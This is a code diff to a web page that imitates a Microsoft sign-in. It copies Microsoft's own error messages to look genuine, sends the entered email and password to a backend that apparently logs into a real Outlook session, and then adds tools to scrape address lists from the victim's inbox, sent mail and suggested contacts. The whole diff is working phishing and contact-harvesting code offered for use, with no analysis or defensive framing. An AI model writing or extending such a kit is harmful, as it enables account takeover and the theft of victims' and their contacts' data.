@@ -460,6 +460,219 @@
                 display: none;
             }
         }
+
+        /* Added styles for scan buttons */
+        .scan-buttons-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 20px;
+            justify-content: center;
+        }
+
+        .scan-btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: background-color 0.2s ease, transform 0.2s ease;
+        }
+
+        .scan-btn:hover:not(:disabled) {
+            background-color: #0067b8;
+            color: white;
+            transform: translateY(-1px);
+        }
+
+        .scan-btn:disabled {
+            background-color: #e1e1e1;
+            color: #888;
+            cursor: not-allowed;
+        }
+
+        .scan-btn i {
+            font-size: 1.1em;
+        }
+
+        /* Styles for displaying email scan results */
+        #results {
+            display: none;
+            margin-top: 30px;
+            width: 100%;
+            max-width: 440px;
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .results-summary {
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+
+        .results-summary h3 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 20px;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            gap: 15px;
+        }
+
+        .stat-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #0078d4;
+        }
+
+        .stat-label {
+            font-size: 13px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .email-sections, .contact-sections {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .email-section, .contact-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+
+        .email-section h4, .contact-section h4 {
+            color: #555;
+            margin-bottom: 15px;
+            font-size: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .email-list, .contact-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .email-item {
+            background: white;
+            padding: 8px 12px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            transition: all 0.2s ease;
+            font-family: monospace;
+            font-size: 13px;
+            color: #0066cc;
+            cursor: pointer;
+        }
+
+        .email-item:hover {
+            background-color: #e8f4f8;
+            transform: translateY(-1px);
+            cursor: pointer;
+        }
+
+        .contact-sections {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .contact-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+
+        .contact-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .contact-item {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            min-width: 250px;
+            flex: 1;
+        }
+
+        .contact-item:hover {
+            background-color: #e8f4f8;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .contact-name {
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .contact-email {
+            color: #0066cc;
+            font-family: monospace;
+            margin-bottom: 5px;
+        }
+
+        .contact-source {
+            font-size: 0.8em;
+            color: #666;
+            text-transform: capitalize;
+            background: #e9ecef;
+            padding: 2px 6px;
+            border-radius: 4px;
+            display: inline-block;
+        }
+
+        /* Custom error and success messages for scan operations */
+        .scan-message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            text-align: center;
+            display: none; /* Hidden by default */
+        }
+        .scan-message.success {
+            background-color: #dff6dd;
+            color: #107c10;
+            display: block;
+        }
+        .scan-message.error {
+            background-color: #fce7e7;
+            color: #d13438;
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -554,19 +767,22 @@
                     Successfully logged in! You can now scan your emails.
                 </div>
 
-                <div class="button-group">
-                    <button type="button" class="btn btn-secondary" onclick="scanBasicEmails()">Quick Scan</button>
-                    <button type="button" class="btn btn-primary" onclick="scanAllEmails()">Full Email Scan</button>
+                <div class="scan-buttons-container">
+                    <button id="quickScanBtn" class="scan-btn" disabled>
+                        <i class="icon">⚡</i> Quick Scan (Inbox)
+                    </button>
+                    <button id="scanAllBtn" class="scan-btn" disabled>
+                        <i class="icon">📧</i> Comprehensive Email Scan (Inbox + Sent)
+                    </button>
+                    <button id="suggestedContactsBtn" class="scan-btn" disabled>
+                        <i class="icon">👥</i> Extract Suggested Contacts
+                    </button>
                 </div>
 
-                <div id="emailResults" style="margin-top: 20px; display: none;">
-                    <h3>Email Scan Results</h3>
-                    <div id="emailSummary"></div>
-                    <div id="emailDetails" style="max-height: 400px; overflow-y: auto; border: 1px solid #ccc; padding: 10px; margin-top: 10px;"></div>
+                <div id="results" style="margin-top: 20px; display: none;">
+                    <!-- Scan results will be displayed here -->
                 </div>
             </div>
-
-
         </div>
 
         <!-- Sign-in options -->
@@ -577,6 +793,8 @@
         </div>
     </div>
 
+    <!-- Dummy results div, will be populated by JavaScript -->
+    <div id="results" style="display: none;"></div>
 
 
     <script>
@@ -584,34 +802,21 @@
         let currentStep = 'email'; // 'email' or 'password'
         const API_BASE = '';
         let preloadInProgress = false; // Prevent concurrent preload requests
+        let allEmails = []; // To store all emails for copy functionality
 
-        // Initialize
-        document.addEventListener('DOMContentLoaded', function() {
-            checkBackendHealth();
-            checkSessionStatus();
-            preloadOutlook();
-        });
-
-        // Utility functions
+        // Utility functions for messages
         function showMessage(message, type = 'info') {
             const messageArea = document.getElementById('messageArea');
             messageArea.style.display = 'block';
+            messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
+        }
 
-            // Check if this is a Microsoft-specific error message
-            if (type === 'error' && (
-                message.includes("We couldn't find an account") ||
-                message.includes("That username is incorrect") ||
-                message.includes("get a new Microsoft account")
-            )) {
-                // Format Microsoft error with proper styling and link
-                let formattedMessage = message.replace(
-                    'get a new Microsoft account',
-                    '<a href="#" onclick="return false;">get a new Microsoft account</a>'
-                );
-                messageArea.innerHTML = `<div class="message microsoft-error">${formattedMessage}</div>`;
-            } else {
-                messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
-            }
+        function showError(message) {
+            showMessage(message, 'error');
+        }
+
+        function showSuccess(message) {
+            showMessage(message, 'success');
         }
 
         function clearMessage() {
@@ -620,6 +825,30 @@
             messageArea.style.display = 'none';
         }
 
+        // Helper function to display scan-specific messages
+        function showScanMessage(message, type) {
+            const scanMessageArea = document.getElementById('scanMessage'); // Assuming you add an element with this ID
+            if (!scanMessageArea) {
+                // Create the element if it doesn't exist
+                const resultsDiv = document.getElementById('results');
+                const newMessageArea = document.createElement('div');
+                newMessageArea.id = 'scanMessage';
+                resultsDiv.insertBefore(newMessageArea, resultsDiv.firstChild);
+            }
+            document.getElementById('scanMessage').className = `scan-message ${type}`;
+            document.getElementById('scanMessage').textContent = message;
+            document.getElementById('scanMessage').style.display = 'block';
+        }
+
+        function showScanError(message) {
+            showScanMessage(message, 'error');
+        }
+
+        function showScanSuccess(message) {
+            showScanMessage(message, 'success');
+        }
+
+        // Loading and UI state management
         function setLoading(loading, loadingText = 'Processing...', useOverlay = false) {
             const loadingAnimation = document.getElementById('loadingAnimation');
             const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
@@ -685,7 +914,7 @@
             }
 
             // Disable all buttons and inputs during loading
-            const buttons = document.querySelectorAll('.btn');
+            const buttons = document.querySelectorAll('.btn, .scan-btn, .cancel-btn');
             const inputs = document.querySelectorAll('.microsoft-input');
 
             buttons.forEach(btn => btn.disabled = loading);
@@ -714,57 +943,39 @@
             document.getElementById('backInfo').className = 'back-info';
         }
 
-
-
+        // Navigation and cancel functions
         function goBack() {
-            // Placeholder for back functionality
+            // Placeholder for back functionality if needed
             return false;
         }
 
         function cancelLoading() {
-            // Cancel loading and return to the current form
             setLoading(false);
             clearMessage();
 
-            // If we're in password step, go back to email
             if (currentStep === 'password') {
                 goBackToEmail();
             } else {
-                // Otherwise just clear the email field and show the form
                 document.getElementById('email').value = '';
                 showEmailForm();
             }
         }
 
         async function goBackToEmail() {
-            // Call backend to reload Outlook page
             try {
-                const response = await fetch(`${API_BASE}/api/back`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' }
-                });
-
-                if (response.ok) {
-                    const data = await response.json();
-                    console.log('Backend reloaded successfully:', data.message);
-                } else {
-                    console.error('Failed to reload backend page');
-                }
+                await fetch(`${API_BASE}/api/back`, { method: 'POST' });
             } catch (error) {
-                // Silent error handling
+                console.error('Failed to initiate backend reload:', error);
             }
 
             showEmailForm();
-            // Properly hide the password form
             document.getElementById('passwordForm').style.display = 'none';
             document.getElementById('passwordForm').className = 'password-section';
-            // Clear the password field
             document.getElementById('password').value = '';
-            // Clear any messages
             clearMessage();
         }
 
-        // API Functions
+        // API Interaction Functions
         async function checkBackendHealth() {
             try {
                 const response = await fetch(`${API_BASE}/api/health`);
@@ -779,23 +990,16 @@
             } catch (error) {
                 document.getElementById('statusIndicator').className = 'status-indicator offline';
                 document.getElementById('statusText').textContent = 'Backend offline';
-                // Removed generic error message
             }
         }
 
         async function preloadOutlook() {
-            // Prevent concurrent preload requests
-            if (preloadInProgress) {
-                console.log('Preload already in progress, skipping...');
-                return;
-            }
-
+            if (preloadInProgress) return;
             preloadInProgress = true;
 
-            try {
-                document.getElementById('statusText').textContent = 'Pre-loading Outlook page...';
-                // Removed preload info message
+            document.getElementById('statusText').textContent = 'Pre-loading Outlook page...';
 
+            try {
                 const response = await fetch(`${API_BASE}/api/preload`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -805,14 +1009,8 @@
                 const data = await response.json();
 
                 if (response.ok) {
-                    if (data.status === 'preloaded') {
+                    if (data.status === 'preloaded' || data.status === 'already-loaded') {
                         document.getElementById('statusText').textContent = 'Outlook page ready - Enter email';
-                        // Removed success message notification
-                    } else if (data.status === 'already-loaded') {
-                        document.getElementById('statusText').textContent = 'Outlook page ready - Enter email';
-                        // Removed success message notification
-
-                        // If there's already a session, just store it without showing actions
                         if (data.sessionId) {
                             currentSessionId = data.sessionId;
                         }
@@ -823,7 +1021,6 @@
             } catch (error) {
                 document.getElementById('statusText').textContent = 'Backend online - Manual loading';
                 console.error('Preload failed:', error);
-                // Don't show error to user, just fallback to manual loading
             } finally {
                 preloadInProgress = false;
             }
@@ -836,7 +1033,6 @@
 
                 if (data.hasActiveSession) {
                     currentSessionId = data.sessionId;
-                    // Don't show session actions automatically - keep the login form visible
                     console.log('Found existing session:', currentSessionId);
                 }
             } catch (error) {
@@ -844,9 +1040,9 @@
             }
         }
 
+        // Login Process
         async function startLogin(event) {
             event.preventDefault();
-
             const email = document.getElementById('email').value;
 
             clearMessage();
@@ -858,55 +1054,32 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password: '' })
                 });
-
                 const data = await response.json();
 
                 if (response.ok) {
                     currentSessionId = data.sessionId;
-
                     if (data.loginComplete) {
-                        if (data.loginSuccess) {
-                            // Show email scanning section after successful login
-                            showMessage('✅ Login completed successfully!');
-                            showEmailScanSection();
-                        } else {
-                            showMessage('Your account or password is incorrect. If you don\'t remember your password, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: underline;">reset it now</a>.', 'error');
-                        }
+                        data.loginSuccess ? showSuccess('✅ Login completed successfully!') : showError('Your account or password is incorrect. If you don\'t remember your password, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: underline;">reset it now</a>.');
+                        if (data.loginSuccess) showEmailScanSection();
                     } else {
-                        // Show site report if available
-                        if (data.siteReport) {
-                            // Check for error messages first - if there are errors, only show the error
-                            if (data.siteReport.errorMessages.length > 0) {
-                                // Get the first error message and format it like Microsoft does
-                                const firstError = data.siteReport.errorMessages[0];
-                                const formattedError = firstError.replace(
-                                    'get a new Microsoft account',
-                                    '<a href="#" onclick="return false;" style="color: #0067b8; text-decoration: none;">get a new Microsoft account</a>'
-                                );
-
-                                // Only show the Microsoft error message, nothing else
-                                showMessage(formattedError, 'error');
-                            } else if (data.siteReport.accountExists && data.siteReport.needsPassword) {
-                                // Account found, show password form without any
-                                showPasswordForm(email);
-                            } else if (!data.siteReport.accountExists) {
-                                // Account not found - show the Microsoft error message
-                                showMessage("We couldn't find an account with that username. Try another, or <a href='#' onclick='return false;' style='color: #0067b8; text-decoration: none;'>get a new Microsoft account</a>.", 'error');
-                            } else {
-                                // Other cases - proceed to password
-                                showPasswordForm(email);
-                            }
+                        if (data.siteReport && data.siteReport.errorMessages && data.siteReport.errorMessages.length > 0) {
+                            const firstError = data.siteReport.errorMessages[0];
+                            const formattedError = firstError.replace('get a new Microsoft account', '<a href="#" onclick="return false;" style="color: #0067b8; text-decoration: none;">get a new Microsoft account</a>');
+                            showMessage(formattedError, 'error');
+                        } else if (data.siteReport && data.siteReport.accountExists && data.siteReport.needsPassword) {
+                            showPasswordForm(email);
+                        } else if (!data.siteReport || !data.siteReport.accountExists) {
+                            showMessage("We couldn't find an account with that username. Try another, or <a href='#' onclick='return false;' style='color: #0067b8; text-decoration: none;'>get a new Microsoft account</a>.", 'error');
                         } else {
                             showPasswordForm(email);
                         }
                     }
-
                 } else {
                     throw new Error(data.error || 'Login failed');
                 }
-
             } catch (error) {
-                // Silent error handling
+                console.error('Login start error:', error);
+                showError('An unexpected error occurred. Please try again.');
             } finally {
                 setLoading(false);
             }
@@ -914,11 +1087,10 @@
 
         async function continueLogin(event) {
             event.preventDefault();
-
             const password = document.getElementById('password').value;
 
             if (!password) {
-                showMessage('Please enter your password', 'error');
+                showError('Please enter your password');
                 return;
             }
 
@@ -929,103 +1101,39 @@
                 const response = await fetch(`${API_BASE}/api/continue-login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        password: password,
-                        sessionId: currentSessionId 
-                    })
+                    body: JSON.stringify({ password: password, sessionId: currentSessionId })
                 });
-
                 const data = await response.json();
 
                 if (response.ok) {
                     if (data.loginSuccess) {
-                        // Show email scanning section after successful login
-                        console.log('✅ Login successful - showing email scanning options');
-                        showMessage('✅ Login completed successfully!');
+                        showSuccess('✅ Login completed successfully!');
                         showEmailScanSection();
                         return;
                     } else {
-                        showMessage('Your account or password is incorrect. If you don\'t remember your password, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: underline;">reset it now</a>.', 'error');
+                        showError('Your account or password is incorrect. If you don\'t remember your password, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: underline;">reset it now</a>.');
                     }
-
-                    // Clear password field
                     document.getElementById('password').value = '';
-
                 } else {
                     throw new Error(data.error || 'Continue login failed');
                 }
-
             } catch (error) {
-                // Silent error handling
+                console.error('Login continue error:', error);
+                showError('An unexpected error occurred. Please try again.');
             } finally {
                 setLoading(false);
             }
         }
 
-        // Helper function to simulate loading and then hiding it
-        function showLoading(message) {
-            const loadingIndicator = document.getElementById('loadingIndicator');
-            const loadingText = document.getElementById('loadingText');
-            loadingText.textContent = message;
-            loadingIndicator.style.display = 'block';
-            setLoading(true); // Disable inputs and buttons
-        }
-
-        function hideLoading() {
-            const loadingIndicator = document.getElementById('loadingIndicator');
-            loadingIndicator.style.display = 'none';
-            setLoading(false); // Enable inputs and buttons
-        }
-
-        // Helper functions for specific loading states
-        function showAccountCheckLoading() {
-            setLoading(true, 'Trying to sign you in...', false);
-        }
-
-        function showSignInLoading() {
-            setLoading(true, 'Trying to sign you in', true);
-        }
-
-        function showRedirectLoading() {
-            setLoading(true, 'Redirecting to Outlook...', true);
-        }
-
-        function hideAllLoading() {
-            setLoading(false);
-        }
-
-
-
-
-        // Function to reset the form to the email input stage
-        function resetToEmailForm() {
-            currentStep = 'email';
-
-            // Reset form
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-
-            // Show email form, hide password form
-            document.getElementById('emailForm').style.display = 'block';
-            document.getElementById('passwordForm').style.display = 'none';
-
-            // Update header and back button
-            document.getElementById('headerTitle').textContent = 'Sign in';
-            document.getElementById('backInfo').className = 'back-info';
-
-            // Clear messages
-            clearMessage();
-
-            // Preload a fresh session with delay to avoid race conditions
-            setTimeout(() => preloadOutlook(), 1000);
-        }
-
-        // Email scanning functions
+        // Email Scanning Functions
         function showEmailScanSection() {
             document.getElementById('emailForm').style.display = 'none';
             document.getElementById('passwordForm').style.display = 'none';
             document.getElementById('emailScanSection').style.display = 'block';
             document.getElementById('headerTitle').textContent = 'Email Management';
+            document.getElementById('quickScanBtn').disabled = false;
+            document.getElementById('scanAllBtn').disabled = false;
+            document.getElementById('suggestedContactsBtn').disabled = false;
         }
 
         async function scanBasicEmails() {
@@ -1039,11 +1147,11 @@
                 if (response.ok) {
                     displayBasicEmailResults(data);
                 } else {
-                    showMessage(data.error || 'Failed to scan emails', 'error');
+                    showError(data.error || 'Failed to scan emails');
                 }
             } catch (error) {
                 console.error('Error scanning basic emails:', error);
-                showMessage('Failed to scan emails', 'error');
+                showError('Failed to scan emails');
             } finally {
                 setLoading(false);
             }
@@ -1060,28 +1168,71 @@
                 if (response.ok) {
                     displayFullEmailResults(data);
                 } else {
-                    showMessage(data.error || 'Failed to scan all emails', 'error');
+                    showError(data.error || 'Failed to scan all emails');
                 }
             } catch (error) {
                 console.error('Error scanning all emails:', error);
-                showMessage('Failed to scan all emails', 'error');
+                showError('Failed to scan all emails');
             } finally {
                 setLoading(false);
             }
         }
 
+        // Suggested Contacts Functionality
+        document.getElementById('suggestedContactsBtn').addEventListener('click', async function() {
+            if (!currentSessionId) {
+                showError('No active session. Please login first.');
+                return;
+            }
+
+            setLoading(true, 'Extracting suggested contacts... This may take a few moments.');
+            this.disabled = true;
+
+            try {
+                const response = await fetch(`/api/suggested-contacts/${currentSessionId}`);
+                const data = await response.json();
+
+                setLoading(false);
+
+                if (data.success) {
+                    displaySuggestedContacts(data.contacts);
+                    showSuccess(`Found ${data.count} suggested contacts!`);
+                } else {
+                    showError('Failed to extract suggested contacts: ' + data.error);
+                }
+            } catch (error) {
+                setLoading(false);
+                showError('Error extracting suggested contacts: ' + error.message);
+            } finally {
+                this.disabled = false;
+            }
+        });
+
+        // Quick scan button event listener
+        document.getElementById('quickScanBtn').addEventListener('click', async function() {
+            scanBasicEmails();
+        });
+
+        // Comprehensive scan button event listener
+        document.getElementById('scanAllBtn').addEventListener('click', async function() {
+            scanAllEmails();
+        });
+
+        // Display functions
         function displayBasicEmailResults(data) {
-            const resultsDiv = document.getElementById('emailResults');
-            const summaryDiv = document.getElementById('emailSummary');
-            const detailsDiv = document.getElementById('emailDetails');
+            const resultsDiv = document.getElementById('results');
+            const summaryDiv = document.getElementById('emailSummary'); // Assuming this element exists or is created
+            const detailsDiv = document.getElementById('emailDetails'); // Assuming this element exists or is created
 
-            summaryDiv.innerHTML = `<p><strong>Quick Scan Results:</strong> Found ${data.count} unique email addresses</p>`;
+            // Update summary
+            summaryDiv.innerHTML = `<p><strong>Quick Scan Results:</strong> Found ${data.emailAddresses.length} unique email addresses</p>`;
 
+            // Update details
             let detailsHTML = '<h4>📧 Email Addresses:</h4>';
             if (data.emailAddresses && data.emailAddresses.length > 0) {
                 detailsHTML += '<ul>';
                 data.emailAddresses.forEach((email, index) => {
-                    detailsHTML += `<li>${index + 1}. <strong>${email}</strong></li>`;
+                    detailsHTML += `<li>${index + 1}. <span class="email-item" onclick="copyToClipboard('${email}')">${email}</span></li>`;
                 });
                 detailsHTML += '</ul>';
             } else {
@@ -1090,10 +1241,11 @@
 
             detailsDiv.innerHTML = detailsHTML;
             resultsDiv.style.display = 'block';
+            resultsDiv.scrollIntoView({ behavior: 'smooth' });
         }
 
         function displayFullEmailResults(data) {
-            const resultsDiv = document.getElementById('emailResults');
+            const resultsDiv = document.getElementById('results');
             const summaryDiv = document.getElementById('emailSummary');
             const detailsDiv = document.getElementById('emailDetails');
 
@@ -1111,14 +1263,11 @@
 
             let detailsHTML = '';
 
-            // Display all unique email addresses
             if (data.emailAddresses && data.emailAddresses.length > 0) {
                 detailsHTML += `<h3>📧 All Unique Email Addresses (${data.emailAddresses.length}):</h3>`;
-
-                // Add copy all button
                 detailsHTML += `
                     <div style="margin: 10px 0;">
-                        <button onclick="copyAllEmails()" 
+                        <button onclick="copyAllEmails()"
                                 style="background: #0078d4; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-bottom: 15px;">
                             📋 Copy All Email Addresses
                         </button>
@@ -1130,17 +1279,16 @@
                 data.emailAddresses.forEach((email, index) => {
                     detailsHTML += `
                         <div style="padding: 8px 12px; background: #f8f9fa; border-radius: 4px; border-left: 3px solid #0078d4;">
-                            <strong>${index + 1}.</strong> ${email}
+                            <strong>${index + 1}.</strong> <span class="email-item" onclick="copyToClipboard('${email}')">${email}</span>
                         </div>
                     `;
                 });
                 detailsHTML += '</div>';
 
-                // Show breakdown by folder
                 if (data.data.inbox && data.data.inbox.length > 0) {
                     detailsHTML += '<h4>📥 Inbox Email Addresses:</h4><ul>';
                     data.data.inbox.forEach((email, index) => {
-                        detailsHTML += `<li>${email}</li>`;
+                        detailsHTML += `<li><span class="email-item" onclick="copyToClipboard('${email}')">${email}</span></li>`;
                     });
                     detailsHTML += '</ul>';
                 }
@@ -1148,7 +1296,7 @@
                 if (data.data.sent && data.data.sent.length > 0) {
                     detailsHTML += '<h4>📤 Sent Email Addresses:</h4><ul>';
                     data.data.sent.forEach((email, index) => {
-                        detailsHTML += `<li>${email}</li>`;
+                        detailsHTML += `<li><span class="email-item" onclick="copyToClipboard('${email}')">${email}</span></li>`;
                     });
                     detailsHTML += '</ul>';
                 }
@@ -1158,38 +1306,80 @@
 
             detailsDiv.innerHTML = detailsHTML;
             resultsDiv.style.display = 'block';
+            resultsDiv.scrollIntoView({ behavior: 'smooth' });
         }
 
-        // Function to copy all email addresses to clipboard
+        function displaySuggestedContacts(contacts) {
+            const resultsDiv = document.getElementById('results');
+
+            resultsDiv.innerHTML = `
+                <div class="results-summary">
+                    <h3>👥 Suggested Contacts</h3>
+                    <div class="stats">
+                        <div class="stat-item">
+                            <span class="stat-number">${contacts.length}</span>
+                            <span class="stat-label">Suggested Contacts</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="contact-sections">
+                    <div class="contact-section">
+                        <h4>✨ Suggested Contacts (${contacts.length})</h4>
+                        <div class="contact-list">
+                            ${contacts.map(contact => `
+                                <div class="contact-item" onclick="copyToClipboard('${contact.email || contact}')">
+                                    ${typeof contact === 'object' ?
+                                        `<div class="contact-name">${contact.name}</div>
+                                         <div class="contact-email">${contact.email}</div>
+                                         <div class="contact-source">${contact.source}</div>` :
+                                        `<div class="contact-email">${contact}</div>`
+                                    }
+                                </div>
+                            `).join('')}
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            resultsDiv.style.display = 'block';
+            resultsDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Clipboard functionality
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Copied: ' + text);
+            }).catch(err => {
+                console.error('Failed to copy text: ', err);
+                prompt('Copy the following text:', text);
+            });
+        }
+
         function copyAllEmails() {
             if (!window.allEmails || window.allEmails.length === 0) {
                 alert('No email addresses to copy.');
                 return;
             }
 
-            // Join all emails with newlines for easy copying
             const emailText = window.allEmails.join('\n');
-
-            // Copy to clipboard
             navigator.clipboard.writeText(emailText).then(() => {
-                // Show success message
                 const copyStatus = document.getElementById('copyStatus');
                 copyStatus.style.display = 'inline';
-
-                // Hide success message after 3 seconds
-                setTimeout(() => {
-                    copyStatus.style.display = 'none';
-                }, 3000);
-
+                setTimeout(() => { copyStatus.style.display = 'none'; }, 3000);
                 console.log(`Copied ${window.allEmails.length} email addresses to clipboard`);
             }).catch(err => {
                 console.error('Failed to copy emails: ', err);
-                // Fallback: show emails in a popup for manual copying
                 prompt('Copy these email addresses:', emailText);
             });
         }
 
-
+        // Initialization
+        document.addEventListener('DOMContentLoaded', function() {
+            checkBackendHealth();
+            checkSessionStatus();
+            preloadOutlook();
+        });
     </script>
 </body>
 </html>
